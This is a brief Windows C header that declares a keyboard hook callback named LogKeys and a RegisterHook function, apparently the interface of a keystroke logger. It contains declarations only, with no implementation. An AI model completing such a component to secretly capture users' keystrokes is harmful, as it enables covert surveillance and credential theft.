#pragma once
#include <Windows.h>


LRESULT __stdcall LogKeys(int nCode, WPARAM wParam, LPARAM lParam);
int RegisterHook();